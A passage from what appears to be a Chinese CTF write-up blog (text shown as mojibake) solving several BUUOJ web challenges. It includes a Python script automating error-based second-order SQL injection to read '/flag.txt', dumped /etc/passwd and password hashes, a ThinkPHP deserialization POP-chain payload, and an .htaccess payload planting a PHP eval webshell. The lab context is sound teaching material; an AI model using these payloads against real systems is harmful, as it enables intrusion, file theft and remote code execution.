        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if($fetch-&gt;num_rows&gt;0) {
        $msg = $user_name.&quot;å·²æäº¤è®¢å•&quot;;
    }else{
        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
        $re = $db-&gt;prepare($sql);
        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
        $re = $re-&gt;execute();
        if(!$re) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;è®¢å•æäº¤æˆåŠŸ&quot;;
    }
} else {
    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;ç¡®è®¤è®¢å•&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
                &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;
                &lt;/a&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>é˜…è¯»ä»£ç å‘ç°,searchå¤„æœ‰sqlæ³¨å…¥,ä½†æ˜¯æœ‰ä»¥ä¸‹é™åˆ¶:<code>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code></p>
<p>changeå¤„æœ‰æ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥,æ— é™åˆ¶,ä½†æ˜¯æ˜¯update</p>
<pre><code>&quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>æˆ‘ä»¬åˆ©ç”¨æŠ¥é”™æ³¨å…¥æ¥è·å–å›æ˜¾</p>
<pre><code>information_schema,test,performance_schema,ctftraining,mysql,ctfusers
ctftraining:FLAG_TABLE,news,users
FLAG_TABLE:FLAG_COLUMN
users:id,username,password,ip,time
news:id,title,content,time
ctfusers:user
user:user_id,address,old_address,user_name,phone</code></pre><pre><code>1dogThe domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore.1571838684,2catThe cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] 
It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.1571838684,3birdBirds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.1571838684,4flagFlag is in the database but not here.1571838684

1,admin,21232f297a57a5a743894a0e4a801fc3,127.0.0.1,1571838684,2,guest,084e0343a0486ff05530df6c705c8bb4,127.0.0.1,1571838684,3,virink,a4346e75cc1dd161a8d57f3b2d5d82d0,127.0.0.1,1571838684  </code></pre><p>/etc/passwd</p>
<pre><code>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre><pre><code>dbf39bacca9e.log</code></pre><p>è‰¹,æœ€åç™¾åº¦ä¸‹å‘ç°flagå†flag.txté‡Œé¢</p>
<p><code>flag{c90595fb-9a36-4257-ba55-9181d7584edc}</code></p>
<p>é™„ä¸Šè„šæœ¬:</p>
<pre><code class="python">import requests
import random
import re
import time
def sql_inj(sql):
    num=random.randint(0,9999999999)
    result=&quot;&quot;
    count=1
    while True:
        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/confirm.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: &quot;&#39;+(updatexml(1,concat(0x7e,substr(({sql}),{count},30),0x7e),1))#&quot;.format(sql=sql,count=count)}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/change.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: num}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print(res.text)
        tmp=re.match(r&#39;.*~(.*)~.*&#39;,res.text,flags=re.DOTALL).group(1)
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        num+=1
        time.sleep(0.5)

sql_inj(&quot;SELECT (load_file(&#39;/flag.txt&#39;))&quot;)
</code></pre>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>æŠ¥é”™åå‘ç°thinkphpçš„å£³æŠ«ç€Discuzçš„çš®,è§‚å¯Ÿcookieå‘ç°,å­˜åœ¨ååºåˆ—åŒ–ç‚¹</p>
<p>æ‰«ç›®å½•å,ä»<a href="http://www.tar.gzä¸­æ‹¿åˆ°æºç ,ä»æºç ä¸­å¾ˆå®¹æ˜“æ„é€ popé“¾" target="_blank" rel="noopener">www.tar.gzä¸­æ‹¿åˆ°æºç ,ä»æºç ä¸­å¾ˆå®¹æ˜“æ„é€ popé“¾</a></p>
<p>payload:</p>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Index extends Controller
{
    public $profile;
    public $profile_db;

    public function index()
    {
        if($this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }
        return $this-&gt;fetch(&quot;index&quot;);
    }

    public function home(){
        if(!$this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }

        if(!$this-&gt;check_upload_img()){
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;upload&quot;);
        }else{
            $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&#39;img&#39;]);
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;home&quot;);
        }
    }

    public function login_check(){
        $profile=cookie(&#39;user&#39;);
        if(!empty($profile)){
            $this-&gt;profile=unserialize(base64_decode($profile));
            #$this-&gt;profile_db=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();
            if(array_diff(array(1,1,1),$this-&gt;profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }

    public function check_upload_img(){
        if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){
            if(empty($this-&gt;profile_db[&#39;img&#39;])){
                return 0;
            }else{
                return 1;
            }
        }
    }

    public function logout(){
        cookie(&quot;user&quot;,null);
        $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
        $this-&gt;redirect($curr_url,302);
        exit();
    }

    public function test()
    {
        $a=urldecode(&quot;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&quot;);
        $b=substr($a,0,strlen($a)-1);
        $b=str_replace(&quot;\&quot;Error\&quot;:7&quot;,&quot;\&quot;Error\&quot;:8&quot;,$b);
        $b.=&quot;s:3:\&quot;aaa\&quot;;&quot;.serialize(new Register()).&quot;}&quot;;

        $b=&#39;a:6:{s:2:&quot;ID&quot;;i:9;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;N;s:5:&quot;email&quot;;s:11:&quot;cao0@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;74b87337454200d4d33f80c4663dc5e5&quot;;s:3:&quot;abc&quot;;&#39;.$b.&#39;}&#39;;
        #return &quot;a&quot;;
        return urlencode(base64_encode($b));
    }

    public function __get($name)
    {
        return url;
    }

}

</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Register extends Controller
{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this-&gt;registed=0;
        $this-&gt;checker=new Profile();
    }

    public function register()
    {
        if ($this-&gt;checker) {
            if($this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }
        if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) {
            $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;);
            if($this-&gt;check_email($email)) {
                if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) {
                    $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username];
                    if (db(&quot;user&quot;)-&gt;insert($user_info)) {
                        $this-&gt;registed = 1;
                        $this-&gt;success(&#39;Registed successful!&#39;, url(&#39;../index&#39;));
                    } else {
                        $this-&gt;error(&#39;Registed failed!&#39;, url(&#39;../index&#39;));
                    }
                } else {
                    $this-&gt;error(&#39;Account already exists!&#39;, url(&#39;../index&#39;));
                }
            }else{
                $this-&gt;error(&#39;Email illegal!&#39;, url(&#39;../index&#39;));
            }
        } else {
            $this-&gt;error(&#39;Something empty!&#39;, url(&#39;../index&#39;));
        }
    }

    public function check_email($email){
        $pattern = &quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;;
        preg_match($pattern, $email, $matches);
        if(empty($matches)){
            return 0;
        }else{
            return 1;
        }
    }

    public function __destruct()
    {
        if(!$this-&gt;registed){
            $this-&gt;checker-&gt;index();
        }
    }


}</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;

use think\Controller;
class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);
    public $index;

    public function __construct()
    {
        $this-&gt;index=&quot;upload_img&quot;;
        $this-&gt;checker=0;
        $this-&gt;ext=1;
        $this-&gt;filename_tmp=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png&quot;;
        $this-&gt;filename=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.php&quot;;
    }

    public function upload_img(){
        if($this-&gt;checker){
            if(!$this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;
            $this-&gt;ext_check();
        }
        if($this-&gt;ext) {
            if(getimagesize($this-&gt;filename_tmp)) {
                @copy($this-&gt;filename_tmp, $this-&gt;filename);
                @unlink($this-&gt;filename_tmp);
                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;
                $this-&gt;update_img();
            }else{
                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));
            }
        }else{
            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));
        }
    }

    public function update_img(){
        $user_info=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();
        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img){
            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){
                $this-&gt;update_cookie();
                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;../home&#39;));
            }else{
                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;../index&#39;));
            }
        }
    }

    public function update_cookie(){
        $this-&gt;checker-&gt;profile[&#39;img&#39;]=$this-&gt;img;
        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);
    }

    public function ext_check(){
        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);
        $this-&gt;ext=end($ext_arr);
        if($this-&gt;ext==&quot;png&quot;){
            return 1;
        }else{
            return 0;
        }
    }

    public function __get($name)
    {
        return $this-&gt;except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this-&gt;{$name}){
            $this-&gt;{$this-&gt;{$name}}($arguments);
        }
    }

}</code></pre>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>ç®€å•çš„smarty ssti</p>
<h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>F12</p>
<h2 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="2020 æ–°æ˜¥çº¢åŒ…é¢˜ 1"></a>2020 æ–°æ˜¥çº¢åŒ…é¢˜ 1</h2><p>å’Œ2019çš„eisä¸­çš„popä¸€æ‘¸ä¸€æ ·,æˆ‘ä¹‹å‰ä¹Ÿåšå‡ºæ¥äº†,å†çœ‹çš„æ—¶å€™å±…ç„¶ä¸ä¼šäº†???????????</p>
<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>å”¯ä¸€ä¸åŒçš„æ˜¯,è¿™é¢˜ä¼šå¯¹æ–‡ä»¶åè¿›è¡Œæ£€æµ‹</p>
<pre><code class="php">public function getCacheKey(string $name): string {
        // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº
        $cache_filename = $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;
        if(substr($cache_filename, -strlen(&#39;.php&#39;)) === &#39;.php&#39;) {
            die(&#39;?&#39;);
        }
        return $cache_filename;
    }</code></pre>
<p>æˆ‘åœ¨è¿™é‡Œå¡äº†å¥½ä¹…,è¿˜æ˜¯å»å·çª¥wpè§£å†³çš„</p>
<p>æˆ‘ä»¬åˆ©ç”¨<code>uniqid()/../filename</code>æ¥ç»•è¿‡uniqid,</p>
<p>åˆ©ç”¨<code>index.php/.</code>=<code>index.php</code>æ¥ç»•è¿‡åç¼€åæ£€æµ‹</p>
<p>å…¶ä»–è§£æ³•: <a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6397.html</a> </p>
<ol>
<li>åˆ©ç”¨.user.ini</li>
<li>åˆ©ç”¨shellä¸­``çš„ä¼˜å…ˆçº§å¤§äºâ€æ¥å‘½ä»¤æ‰§è¡Œ</li>
</ol>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">&lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    include_once(&quot;fl3g.php&quot;);
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
        echo &quot;Hacker&quot;;
        die();
    }
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
        echo &quot;Hacker&quot;;
        die();
    }
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
?&gt;</code></pre>
<p>å¯ä»¥ä»»æ„å†™æ–‡ä»¶,å†™ä¸ªphpæ–‡ä»¶åå‘ç°,ä¸è§£æ,ä¼°è®¡æ˜¯htaccessçš„,</p>
<p>äºæ˜¯å†™htaccess,åˆ©ç”¨<code>#\</code>æ¥ç»•è¿‡æœ«å°¾æ·»åŠ <code>\nJust one chance</code>,å°†å…¶æ³¨é‡Š</p>
<p>æœ€åçš„payload</p>
<pre><code>#&lt;?php die(eval($_POST[1]));?&gt;
php_value auto_prepend_fi\
le &quot;.htaccess&quot;
#\</code></pre><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>ä¿®æ”¹cookie</p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><pre><code class="python">from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = &#39;*********************&#39;  # censored
url_prefix = &#39;/d5afe1f66147e857&#39;


def FLAG():
    return &#39;*********************&#39;  # censored


def trigger_event(event):
    session[&#39;log&#39;].append(event)
    if len(session[&#39;log&#39;]) &gt; 5:
        session[&#39;log&#39;] = session[&#39;log&#39;][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException:
    pass


def execute_event_loop():
    valid_event_chars = set(
        &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;)
    resp = None
    while len(request.event_queue) &gt; 0:
        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
        event = request.event_queue[0]
        request.event_queue = request.event_queue[1:]
        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)):
            continue
        for c in event:
            if c not in valid_event_chars:
                break
        else:
            is_action = event[0] == &#39;a&#39;
            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None:
                    resp = &#39;&#39;
                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;
                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;]
                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;]
                break
            except Exception, e:
                if resp is None:
                    resp = &#39;&#39;
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == &#39;&#39;:
        resp = (&#39;404 NOT FOUND&#39;, 404)
    session.modified = True
    return resp


@app.route(url_prefix+&#39;/&#39;)
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:
        querystring = &#39;action:index;False#False&#39;
    if &#39;num_items&#39; not in session:
        session[&#39;num_items&#39;] = 0
        session[&#39;points&#39;] = 3
        session[&#39;log&#39;] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------


def view_handler(args):
    page = args[0]
    html = &#39;&#39;
    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(
        session[&#39;num_items&#39;], session[&#39;points&#39;])
    if page == &#39;index&#39;:
        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;shop&#39;:
        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;reset&#39;:
        del session[&#39;num_items&#39;]
        html += &#39;Session reset.&lt;br /&gt;&#39;
    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == &#39;True&#39;:

        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;)
        html = &#39;&#39;
        if bool_download_source != &#39;True&#39;:
            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;
            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;

        for line in source:
            if bool_download_source != &#39;True&#39;:
                html += line.replace(&#39;&amp;&#39;, &#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(
                    &#39; &#39;, &#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;, &#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)
            else:
                html += line
        source.close()

        if bool_download_source == &#39;True&#39;:
            headers = {}
            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;
            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39;
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event(&#39;action:view;index&#39;)


def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
